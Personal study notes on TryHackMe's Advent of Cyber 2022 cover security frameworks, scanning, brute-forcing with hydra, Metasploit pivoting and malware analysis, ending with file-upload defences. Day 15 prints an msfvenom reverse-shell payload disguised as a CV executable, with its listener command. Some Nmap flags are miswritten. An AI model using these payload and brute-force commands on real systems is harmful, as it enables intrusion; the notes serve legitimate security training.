[Advent Of Cyber 2022 - TryHackMe](https://tryhackme.com/room/adventofcyber4)

## Day 1 - Frameworks

Common Security Frameworks:

1. NIST
2. ISO 27000s
3. MITRE ATT&CK
4. Cyber Kill Chain
5. Unified Kill Chain (mix of 3 and 4)
	- In: Gaining access to the system
	- Through: Increasing priviledges and obtaining information
	- Out: Get results and use them

## Day 2 - Log Analysis

A *SIEM* tool allows a simpler and more profound log analysis, but may be difficult to configure or learn to use. 

## Day 3 - OSINT

Common types of OSINT for SW:

- Google Dorks
- WHOIS lookup (not really useful)
- Robots.txt
- Breached DB Search (haveibeenpwned and such)
- OSS public repositories

## Day 4 - Scanning

In port scanning, 3 results possible:

- Closed
- Opened
- Filtered

*Nmap* can be used for:

- Port Scanning with `-Ss`
- OS Detection with `-O`
- Ping Scanning with `-Sn`
- Service Scanning with `-Sv`

*Nikto* can be used to find common vulnerabilities on websites

## Day 5 - Brute-Forcing

Common Remote Access protocols:

- SSH (cli)
- RDP (windows gui)
- VNC (linux gui)

Authentification can be done using some thing you...

- Know (ex: password)
- Have (ex: RFID key)
- Are (ex: fingerprint)

*Wordlists* are list of common passwords (from leaked DBs)

A hydra command will usually look like so:

	hydra -l USER -P WORDLIST SERVER SERVICE

# Day 6 - Email Analysis

- *emlAnalyser*: Parse mail data for a better view of the contents
- emailrep.io / ipinfo.io / Talos Reputation: Get reputation of mail server or IP
- Browserling / Wannabrowser: Sandboxes browsers for opening links
- VirusTotal / InQuest Labs: attachment analysis (by upload, link or hash)

# Day 7 - CyberChef

*Cyberchef* is a GUI tool for deep analysis and parsing of data or files. Has lots of options and, for well-known operations, it is quite fast compared to writing custom scripts.

*Defanfing* an URL means making it unclickable.

# Day 8 - Smart Contracts

> I did not take notes on this one as it is not one of my interests.

# Day 9 - Pivoting

*/.dockerenv* is a file present in Docker containers. Useful for checking if a compromised application is running inside one.

Some commands in the Metasploit console:

	search MODULE
	use MODULE

	# Once a module is used...
	info (description, options, CVE, etc)
	show options
	set OPTION VALUE
	check 		# not always available
	run

When running a module, a session may be opened. The commands for managing sessions are:

	# show sessions
	sessions

	# upgrade the session to Meterpreter
	sessions -u SESSION_ID

	# open (interact) with a session
	session -i SESSION_ID

	# *once in the session*, go back to the ms console
	background

Meterpreter allows running more complex commands on top of the normal command line, for example:

	# get system information (OS...)
	sysinfo

	# upload a local file to the remote machine
	upload SRC TARGET

	# display interfaces
	ipconfig

	# resolve a host
	resolve HOST


In order to pivot through the network, one can use a Meterpreter session in combination with MS internal routing table.

	# Example usage
	route [add/remove] subnet netmask [comm/sid]

	# Output the routing table
	route print

This greatly facilitates pivoting from the attacker's machine through the Meterpreter session.


*Socks Proxy* is used to channel the traffic between the attacker and host machine. It can be used in combination with proxychains with any command, but then it has to be on port 9050 (on the attacker's side) by default.


Some interesting modules (partial names):

- ignition_laravel
- postgres_schemadump
- postgres_sql
- socks_proxy
- ssh_login

# Day 10 - Hack a Game

*Cetus* is a tool for manipulating memory of a WebASM application.

If no value is provided in the search field, Cetus does a *differential comparison* (comparing each value with the one in the same adres before).


# Day 11 - Memory Forensics

*Volatility* is a tool to analyse memory dumps (running processes, clipboard contents, network connections, etc.). There is a list of [plugins](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html) for these tests.


# Day 12 - Malware Analysis

Common in malware:

- Network connections: Either internal (for lateral movement) or external (for remote access and/or payload download)
- Registry key modifications: For persistance in the machine (for example, automatically run on boot)
- File manipulations: Downloading and/or creating new files needed for execution

- Static Malware Analysis does not execute the code, only inspects the binary
- Dynamic Malware Analysis observes the results of executing the code, should always be done in a sandboxed environment

Tools for Static Analysis:

- Detect It Easy
- Capa

Tools for Dynamic Analysis:

- Process Monitor (Windows)


# Day 13 - Packet Analysis

*PCAP*: Packet capture. Used to make a report for upper-level analysts (Suspicious IPs, names, files, etc).


# Day 14 - Web Applications

*Access Control* determines, once authenticated, if a user can access a resource, modify it, etc.

[OWASP Top 10](https://owasp.org/Top10/): Common vulnerabilities in Web Applications.

*IDOR* (Insecure direct object reference): Vulnerability that allows simple input manipulation to bypass access control. For example using the ID directly on the URL for accessing information.


# Day 15 - Secure Coding

Unrestricted Input Validation on file uploads can lead to:

- Code execution if the uploaded file can be retrieved by the attacker (for example a web shell).
- Infecting workstations, if the file is going to be viewed and opened by a user inside or outside the organisation.

To mitigate the first one, one could store the files outside the Web Root, so they are not directly accessible from the attacker. This is not bullet-proof, as some other vulnerability may be able to recover and run the file. Or even we could hope to have some insider run the code accidentally.


*Metasploit*'s `msfvenom` can be used to poison a file with a certain exploit. For example:

	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT="Listening port" -f exe -o cv-username.exe
	sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 'listening port'; exploit"

Some measures:

- Store outside the Web Root
- Content Type Validation
- File Extension Validation
- File Size Validations
- Renaming the file (preferably to something random)
- Malware Scanning (ClamAV)

